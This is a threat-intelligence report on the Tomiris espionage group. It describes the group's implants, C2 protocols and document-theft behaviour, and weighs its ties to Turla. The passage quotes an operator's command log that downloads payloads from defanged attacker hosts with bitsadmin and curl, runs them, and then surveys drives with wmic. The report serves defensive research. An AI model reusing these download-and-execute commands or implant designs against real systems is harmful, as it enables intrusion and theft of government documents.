In this blog\npost, we\u2019re excited to share what we now know of Tomiris with the broader community, and\ndiscuss further evidence of a possible connection to Turla.\n\nActor profile\nTomiris focuses on intelligence gathering in Central Asia. Tomiris\u2019s endgame\nconsistently appears to be the regular theft of internal documents.\n\n1/19\n\nThe threat actor targets government and diplomatic entities in the CIS. The occasional\nvictims discovered in other regions (such as the Middle East or South-East Asia) turn\nout to be foreign representations of CIS countries, illustrating Tomiris\u2019s narrow focus.\nIt is characterized by its tendency to develop numerous low-sophistication \u201cburner\u201d\nimplants in a variety of programming languages that are repeatedly deployed against\nthe same targets, using elementary but efficient packaging and distribution techniques.\nTomiris occasionally leverages commercial or open-source RATs.\nLanguage artifacts discovered in Tomiris\u2019s implant families and infrastructure from\ndistinct campaigns all indicate that the threat actor is Russian-speaking.\nOverall, Tomiris is a very agile and determined actor, open to experimentation \u2013 for\ninstance with delivery methods (DNS hijacking) or command and control (C2) channels\n(Telegram).\nThe following map shows the countries where we detected Tomiris targets (colored in green:\nAfghanistan and CIS members or ratifiers). It is worth noting that while we identified a few\ntargets in other locations, all of them appear to be foreign diplomatic entities of the colored\ncountries:\n\n2/19\n\nTomiris\u2019s polyglot toolset\nTomiris uses a wide variety of malware implants developed at a rapid pace and in all\nprogramming languages imaginable. We hypothesize that the general aim is to provide\noperators with \u201cfull-spectrum malware\u201d in order to evade security products. In fact, on several\noccasions we observed the actor persistently cycling through available malware strains until\none of them was finally allowed to run on victim machines.\nTools used by Tomiris fall into three categories:\nDownloaders, rudimentary malicious programs whose role is to deploy a backdoor or\nrequired additional legitimate tools.\nBackdoors, whose feature set is typically limited to reconnaissance, command\nexecution, file download and file upload.\nFile stealers specifically built to exfiltrate documents, often relying on a hardcoded list\nof file extensions to automatically find recently edited files and upload them to a C2.\nSome file stealers are backdoor variants and share the same code base.\nTomiris goes after its victims using a wide variety of attack vectors: spear-phishing emails\nwith malicious content attached (password-protected archives, malicious documents,\nweaponized LNKs), DNS hijacking, exploitation of vulnerabilities (specifically ProxyLogon),\nsuspected drive-by downloads and other \u201ccreative\u201d methods (see details of the investigation\ndescribed below). The following table lists all Tomiris malware families we are aware of:\nName\n\nType\n\nLanguage\n\nComments\n\nTomiris\nDownloader\n\nDownloader\n\nC\n\nMentioned in our original blog post.\nSome samples contain traces of Russian\nlanguage.\n\nTomiris\n(Golang\nimplant)\n\nBackdoor\n\nGolang\n\nDescribed in our original blog post.\n\nSBZ[1]\nfilestealer\n\nFile stealer\n\nGolang\n\nDocument stealer based on Tomiris\u2019s (Golang\nimplant) source code.\n\nTomiris\ndownload\nscheduler\n\nDownloader\n\nC\n\nA variant of Tomiris Downloader that\nadditionally uses scheduled tasks to\ndownload a payload.\n\nTomiris .NET\ndownloader\n\nDownloader\n\n.NET\n\nA .NET variant of Tomiris Downloader, mainly\nused to deploy required legitimate tools, such\nas WinSCP.\n\nTelemiris\n\nBackdoor\n\nPython\n\nContains traces of Russian language.\n\n3/19\n\nRoopy\n\nFile stealer\n\nPascal\n\nSimilar to SBZ filestealer (see above).\n\nJLORAT\n\nBackdoor\n\nRust\n\nVarious traces of Russian language in this\nfamily.\n\nJLOGRAB\n\nFile stealer\n\nRust\n\nBased on JLORAT\u2019s source code.\n\nIn addition, Tomiris leveraged open-source or commercially available implants and offensive\ntools. Notably, the latter were associated with Tomiris because they were downloaded from\nTomiris downloader, shared a common C2 with other Tomiris implants, and/or were\nleveraged to deploy other Tomiris implants:\nName\n\nDescription\n\nRATel\n\nOpen-source RAT available on GitHub.\nOne of the samples (MD5 10B315FB7D8BA8D69337F04ED3891E75) that\nwe attributed to Tomiris was downloaded from mail.mfa.uz.webmails[.]info,\nwhich has been referenced by Cyjax.\n\nPython\nMeterpreter\nloader\n\nMetasploit-provided Python script that is leveraged to deploy a Meterpreter\ninstance in memory. These are frequently packed using py2exe, PyInstaller\nor Nuitka.\n\nWarzone\nRAT\n\nA commercial C++ RAT.\n\n4/19\n\nRelationships between Tomiris tools. Arrows indicate direct execution.\nOverall, pieces from the Tomiris toolset appear to be generally interchangeable and don\u2019t\nappear to be tied to specific campaigns or victims. Operators routinely mix and match the\nvarious families, trying to deploy tools (often repeatedly) with little regard for stealth until one\ndoesn\u2019t get caught by antivirus software.\nThe following paragraphs provide a summary description of the main malware strains used\nby Tomiris.\n\nTelemiris\nTelemiris is a Python backdoor originally packed with PyInstaller (we later identified some\nNuitka-packaged samples as well). Its name derives from the fact that it uses Telegram as a\nC2 channel. After setting up persistence (copying itself under %AppData%/service/ and\n5/19\n\ncreating a RUN key entry), the malware enters its main loop where it waits for Telegram\nmessages and replies to them. Supported commands are:\n/run\n\nExecute an arbitrary command on the victim\u2019s machine. It\u2019s worth noting that\ncommand results are expected to be encoded in Cyrillic codepage.\n\n/download\n<path>\n\nSends the contents of the file stored on the victim\u2019s machine at the given\npath.\n\n[file\nattachment]\n\nWrites the received file on the victim\u2019s machine at the path specified in the\nattachment\u2019s caption, or in the current directory by default. Telemiris replies\nwith \u201c\u0424\u0430\u0439\u043b \u0437\u0430\u0433\u0440\u0443\u0436\u0435\u043d!\u201d (\u201cFile downloaded!\u201d).\n\nFrom what we observed, Telemiris is used as a first-stage implant that operators use to\ndeploy other tools such as Roopy, JLORAT, or even the legitimate WinSCP binary, to further\nexfiltrate files.\n\nRoopy\nWritten in Pascal, this file stealer crawls the victim\u2019s filesystem at regular intervals and\nuploads all files of interest to its C2 server. At startup, it wastes CPU cycles on dead code\nand useless loops, which we assume are for evasion purposes. Roopy then creates its\nworking directory (%AppData%/Microsoft/OneDrive) where it stores the list of already\nuploaded files (as upload.dat) and a copy of documents waiting to be uploaded (in the\nbackup subfolder).\nThen, every 40-80 minutes, Roopy crawls C:\\Users and all other drives (D:, E:, \u2026), looks for\nall documents (.doc, .docx, .xls, .xlsx, .txt, .pdf) modified in the last month, and stages them\nfor upload. Discovered files are collected in ZIP archives up to 5MB in size and sent to the\nC2 server over plain HTTP using POST requests containing such data as:\nDelphi/Pascal\n1\n\n{\n\n2\n\n\"n\":\"[timestamp]_[part].zip\",\n\n3\n\n\"t\":\"[computer name]\",\n\n4\n\n\"s\": \"[timestamp]\",\n\n5\n\n\"b64\":\"[base64-encoded zip file]\"\n\n6\n\n}\n\n6/19\n\nThis data format, naming convention as well as the URL scheme used by the C2 server (i.e.,\n/h/pa) are very similar to SBZ filestealer. We identified a number of variants of Roopy where\nlogging can be either enabled or disabled by default, or where the base64 encoding scheme\nwas replaced by a simple subtraction from the bytes of the obfuscated data.\n\nJLORAT\nOur first sightings of this Rust malware date back to August 2022. Similar to Telemiris,\nJLORAT copies itself under %AppData% and sets up persistence via a registry RUN key. It\nalso creates a mutex to ensure atomic execution (\u201cwhatever\u201d, as in the default usage\nexample for the \u201csingle-instance\u201d Rust library that is embedded). The backdoor starts by\ngathering information on the victim machine, such as the system information, current user\nand public IP address. The information is sent via an HTTP POST request to the C2 on a\nnon-standard port (i.e., 9942). Sample data sent by the C2 could be:\nDelphi/Pascal\n\n7/19\n\n1\n\n{\n\n2\n\n\"admin\": true,\n\n3\n\n\"cmd\": \"\",\n\n4\n\n\"cpu_vendor\": {\n\n5\n\n\"brand\": \"[REDACTED]\",\n\n6\n\n\"cores\": 6,\n\n7\n\n\"cpu_usage\": 0,\n\n8\n\n\"frequency\": 2400,\n\n9\n\n\"name\": \"CPU 6\",\n\n10\n\n\"vendor_id\": \"[REDACTED]\"\n\n11\n\n},\n\n12\n\n\"hwid\": \"[REDACTED]\",\n\n13\n\n\"ip\": \"[REDACTED]\",\n\n14\n\n\"memory\": \"32.0\",\n\n15\n\n\"resolution\": \"1280x1024\",\n\n16\n\n\"software\": [\n\n17\n\n\"Microsoft Visual C++ 2005 Redistributable (x64)\",\n\n18\n\n\"[REDACTED, list of further installed software items]\"\n\n19\n\n],\n\n20\n\n\"username\": \"[REDACTED]\",\n\n21\n\n\"version\": \"Windows 7 Professional\"\n\n22\n\n}\n\nJLORAT then looks for specific keywords in the data returned by the C2 to start processing\norders.\n0\n\nNo operation\n\n8/19\n\ncmd|[command]\n\nExecutes the specified command, and returns the result in the cmd\nkey of the JSON response. Some specific subcommands are\nprocessed by JLORAT directly and not passed to the command\nprompt, such as cmd|cd (change working directory), cmd|ls or cmd|dir\n(lists file in the current directory) and cmd|curfile (returns the path to\nthe JLORAT binary).\n\nupload|path\n\nSends the designated file from the victim to the C2, on TCP port 9999.\n\ndownload|url|path\n\nSaves the file at the given URL to the provided path on the victim\u2019s\nmachine.\n\nscreen\n\nTakes a screenshot and sends it to the C2 on TCP port 9999.\n\nData sent to port 9999 is not passed in a JSON dictionary, but instead follows a specific\nformat:\nOffset\n\nField name\n\nDescription\n\n0\n\nFILENAME_LEN\n\nLength of the filename of the data being sent\n\n4\n\nFILENAME\n\nName of the file being sent\n\n4 + FILENAME_LEN\n\nCONTENT_LEN\n\nLength of the data\n\n8 + FILENAME_LEN\n\nCONTENT\n\nPayload\n\nWe also discovered variants of JLORAT bundled with additional modules \u2013 effectively turning\nit into a file stealer we call JLOGRAB. Just like Roopy, JLOGRAB:\nPeriodically looks for documents (a combination of.txt, .pdf, .xml, .xlsx, .doc and .docx\nfiles depending on the sample)\nSaves the list as %AppData%/temp_id.txt\nCopies discovered documents under %AppData%/transport\nUploads them to the C2 in ZIP archives.\nJLORAT contains traces of Russian language in status messages (\u201c\u0414\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u044f\n\u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u0430!\u201d, meaning \u201cDirectory set\u201d). The source binary also contains metadata\nindicating some of the source code is stored in a \u201cmoduls\u201d folder, which appears to be a\nmisspelling of the English word \u201cmodules\u201d, or a poor transliteration of the Russian word\n\u201c\u043c\u043e\u0434\u0443\u043b\u044c\u201d (pronounced: modul\u2019).\n\nTomiris\u2019s deployment spree: TunnusSched giveaway\nOn January 5, 2023, Mandiant released a blog post describing attacks against Ukrainian\nentities that they attributed to Turla. Let\u2019s start by briefly summing up their findings:\n\n9/19\n\nIn September 2022, a threat actor purchased an expired domain name (anam0rph[.]su)\nthat used to be part of a botnet (Andromeda) infrastructure. This allowed them to\nreceive incoming connections from previous, dormant infections and take over a\nnumber of machines.\nVictims in Ukraine were infected with KopiLuwak and QUIETCANARY, two malware\nstrains previously associated with Turla.\nWhile publicly available data indeed shows that anam0rph[.]su was re-registered on August\n12, 2022, we couldn\u2019t find any link between Andromeda and KopiLuwak from our telemetry.\nNevertheless, we had been tracking QUIETCANARY since 2019 under the name\n\u201cTunnusSched\u201d (not \u201cTunnus\u201d as Mandiant\u2019s reporting indicates), and decided to take a\ncloser look at samples collected during the same period.\nTo our great surprise, we discovered one TunnusSched/QUIETCANARY sample (MD5\nB38160FC836AD42F1753A0873C844925) had been delivered to a government target in the\nCIS on September 13, 2022. Our telemetry additionally shows that this TunnusSched\nmalware was deployed\u2026from Tomiris\u2019s Telemiris (MD5\nC49DBF390E876E926A338EA07AC5D4A7).\nMore precisely, on September 13, 2022, around 05:40 UTC, an operator attempted to deploy\nseveral known Tomiris implants via Telemiris: first a Python Meterpreter loader, then JLORAT\nand Roopy. These efforts were thwarted by security products, which led the attacker to make\nrepeated attempts, from various locations on the filesystem:\nDelphi/Pascal\n\n10/19\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n$> bitsadmin /transfer www /download hxxps://telegram.akipress[.]news/lsasss.rar\n[REDACTED]\\lsasss.rar\n$> rar.exe x \"[REDACTED]\\lsasss.rar\" \"[REDACTED]\\\"\n$> [REDACTED]\\lsasss.exe\n$> dir \"[REDACTED]\\\n$> del \"[REDACTED]\\document.rar\"\n$> [...]\n$> wmic list drives\n$> wmic diskdrive get name\n$> wmic logicaldisk where drivetype=5 get deviceid, volumename, description\n$> wmic logicaldisk where drivetype=3 get deviceid, volumename, description\n$> [...]\n\n13\n\n$> bitsadmin /transfer www /download hxxps://telegram.akipress[.]news/lsasss.rar\nF:\\lsasss.rar\n\n14\n\n$> rar.exe x \"F:\\lsasss.rar\" \"F:\\\"\n\n15\n\n$> F:\\lsass.exe\n$> tasklist | findstr /I \"lsasss\"\n\nAll these attempts ended in failure. After a one-hour pause, the operator tried again at 07:19\nUTC, this time using a TunnusSched/QUIETCANARY sample:\nDelphi/Pascal\n1\n\ncurl hxxps://crane[.]mn/wp-content/plugins/jetpack/modules/photoncdn/EpsonDeviceControl.exe \u2013output [REDACTED]\\epsondevicecontrol.exe\n\nThe TunnusSched sample was blocked as well, and the operator resumed trying to deploy\nJLORAT and Roopy samples up to the next day. This activity and brute-force approach to\ninfection is completely consistent with other Tomiris infections we have observed in the past.\n\nAttribution: reading KopiLuwak\u2019s story again\n\n11/19\n\nMandiant noted that some elements of the recent TunnuSched case they analyzed \u201cappear\nto be a departure from historical Turla operations\u201d, but the use of KopiLuwak and\nTunnusSched led them to link this activity to Turla anyway. In order to perform a critical\nanalysis of this attribution process, we need to go back in time.\n\nKopiLuwak has belonged to Turla\nKaspersky first reported on KopiLuwak in 2016. Back then, this JavaScript reconnaissance\ntool was used to deploy ICEDCOFFEE in countries like Greece, Romania and Qatar. We\nattributed the associated attack campaign to Turla and could not find any reason to believe\nthat was incorrect.\n\nTunnusSched and KopiLuwak are part of the same toolset\nStarting from 2019, we discovered additional implant families that were linked to KopiLuwak\n(and so, to Turla), starting from 2019. The implants were additionally linked together, mainly\nbecause they leverage an identical RC4 implementation:\nMalware name\n\nLinks to Turla\n\nTopinambour\n\nDelivered KopiLuwak samples\nShared TTPs (use of compromised WordPress sites)\nSame RC4 implementation as Tunnus and TunnusSched\n\nTunnus\n\nFound on machines infected with KopiLuwak\nShared TTPs (use of compromised WordPress sites)\nSame RC4 implementation as TunnusSched and Topinambour\n\nTunnusSched\n(QUIETCANARY)\n\nShared PDB path with Tunnus\nSame RC4 implementation as Tunnus and Topinambour\n\nRocketMan\n\nFound on machines infected with Topinambour\nCode similarities with TunnusSched\n\n12/19\n\nCode similarity between Topinambour (left) and TunnusSched (right)\nThe RC4 implementation in these samples results in strictly identical .NET bytecode that, as\nfar as we could verify, is unique to Tunnus, TunnusSched and Topinambour.\nThe fact that all these implants are interconnected leaves little doubt, and Topinambour at\nleast is strongly linked with KopiLuwak. As a result, we (still) believe with high confidence\nthat TunnusSched and KopiLuwak are both part of similar toolsets, starting from 2019 at\nthe latest.\nMandiant\u2019s recent findings also confirm that KopiLuwak and TunnusSched were still part\nof the same toolset as of September 2022, as they were both deployed against targets in\nUkraine during a single operation.\n\nBut Tomiris uses TunnusSched\nAs we recently discovered (and detailed in \u201cTomiris\u2019s deployment spree: TunnusSched\ngiveaway\u201d), TunnusSched was leveraged by Tomiris against a government target in the\nCIS in September 2022.\nAdditionally, we believe with medium confidence the TunnusSched usage described by\nMandiant to be part of Tomiris\u2019s operations, because:\n\n13/19\n\nThe TunnusSched sample that was leveraged by Tomiris (MD5\nB38160FC836AD42F1753A0873C844925) is very similar to the one that was deployed\nfrom KopiLuwak as per Mandiant\u2019s reporting (MD5\n403876977DFB4AB2E2C15AD4B29423FF). Most notably, they share identical RC4\nencryption keys, user agent strings, unused code (the \u201cServerInfoExtractor\u201d class),\nPDB root path\n(\u201cc:\\Users\\Scott\\source\\repos\\Kapushka.Client\\BrowserTelemetry\\obj\\Release\\\u201d,\nstarting with a lowercase \u201cc:\u201d), both have explicit references to VisualStudio 15.7, and a\ncompilation date set to September 2022.\nThe TunnusSched sample used by Tomiris and the one referenced by Mandiant were\nboth (only) deployed against targets in the CIS during the same timeframe (September\n2022).\nThe TunnusSched deployment described by Mandiant involved taking over an extinct\nAndromeda C2 domain. We first introduced Tomiris as a threat actor who took over\nlegitimate government hostnames to deploy the Tomiris Golang implant, and it has\ncontinued to do so. As a result, we believe it is likely Tomiris may have hijacked extinct\nAndromeda hostnames or domains.\n\nSo Tomiris uses KopiLuwak!\nAs we have already established, TunnusSched and KopiLuwak are part of similar toolsets\n(starting from 2019 at least). They were also used together during the same operation in\nSeptember 2022 in the CIS, while TunnusSched was also deployed separately by Tomiris in\nthe CIS \u2013 both independently analyzed cases leveraging very similar TunnusSched samples.\nAs a result, we believe with medium-to-high confidence that both TunnusSched and\nKopiLuwak are being leveraged by Tomiris. Additionally, we cannot rule out Tomiris\nhaving used KopiLuwak as early as 2019, conducting operations that may have been\nwrongly attributed to Turla back then.\n\nWait: wouldn\u2019t that mean Tomiris IS Turla?\nThis entire discussion would be moot if we believed Tomiris to be (a sub-cluster of) Turla \u2013\nbut this is not the case. While our initial blog post introducing Tomiris noted similarities with\nmalware used in the Sunburst attack, we continued to track the two sets of activity\nseparately. Years later, we are convinced that despite possible ties between the two groups,\nTurla and Tomiris are separate actors. Tomiris is undoubtedly Russian-speaking, but its\ntargeting and tradecrafts are significantly at odds with what we have observed for Turla. In\naddition, Tomiris\u2019s general approach to intrusion and limited interest in stealth are\nsignificantly at odds with documented Turla tradecraft.\nIt follows that two groups (that we know of) may have used KopiLuwak at different points in\ntime. What are the possible explanations for this?\n\n14/19\n\nIt is possible that Turla doesn\u2019t mind using a tool that was burned in 2016 and is still\nusing it in current operations along with new tools.\nGiven that KopiLuwak, Tunnus, TunnusSched, etc. are written in JavaScript and .NET,\nwhere the source code is essentially provided with the malware, other threat actors\nmay have repurposed these tools and are using them under a false flag.\nTurla shares tool and expertise with Tomiris, or cooperates with Tomiris on joint\noperations. In this scenario, it might be acceptable for Turla to give away burned tools,\nor to use old implants that will not disclose current capabilities to their partners.\nTomiris and Turla rely on a common supplier that provides offensive capabilities. Or\nmaybe Tomiris initially started out as a private outfit writing tools for Turla and is now\nbranching out into the mercenary business. If so, it is entirely possible that Tomiris,\nusing the toolset it developed for Turla, is conducting operations for different\ncustomers.\nOur assessment is that the first two hypotheses are the least likely and that there exists a\nform of deliberate cooperation between Tomiris and Turla. Its exact nature is, however,\nhard to determine with the information we have at hand. In any case, depending on when\nTomiris started using KopiLuwak, a number of campaigns and tools believed to be linked to\nTurla may in fact need to be re-evaluated.\nNot only Topinambour, Tunnus, TunnusSched (QUIETCANARY) and RocketMan may have\nbeen used by Tomiris in the past (we know this is the case for TunnusSched, and very likely\nfor Tunnus due to the discovery of government victims in Russia in 2019), it could also be the\ncase that these tools are Tomiris\u2019s exclusive property. Looking back, we cannot help but\nnotice that all of these tools were predominantly used in the CIS region, which is consistent\nwith Tomiris\u2019s traditional victimology.\n\nConclusion\nWith this report, we hope to alert the community to the dangers of using KopiLuwak and\nTunnusSched to link cyberattacks to Turla. To the best of our knowledge, this toolset is\ncurrently shared between Tomiris and Turla and we cannot rule out that more actors outside\nour purview have access to it. We expect the attribution of this cluster of activities to remain\nunclear for the near future.\nIn the grander scheme of things, this investigation reveals the pitfalls that the information\nsecurity industry faces when working on cyberattacks. We rely on a knowledge pool\ngenerously shared among all participants, yet information decays: what is true today may\nturn out to be wrong tomorrow. Discovering new, reliable data isn\u2019t enough; existing\nassumptions also need to be substantiated \u2013 which can only happen when vendors publish\ndata. In that spirit, we kindly thank Mandiant for the research they published.\n\n15/19\n\nFinally, this investigation illustrates the limits of technical attribution. Looking at infections and\nmalware samples only gets us so far and we are often reminded that APT groups are subject\nto organizational and political constraints. On rare occasions, we stumble upon a piece of the\npuzzle that allows us to pierce the veil.\nAs for the Tomiris mystery, we\u2019ll be eagerly awaiting the next piece.\n\nIndicators of
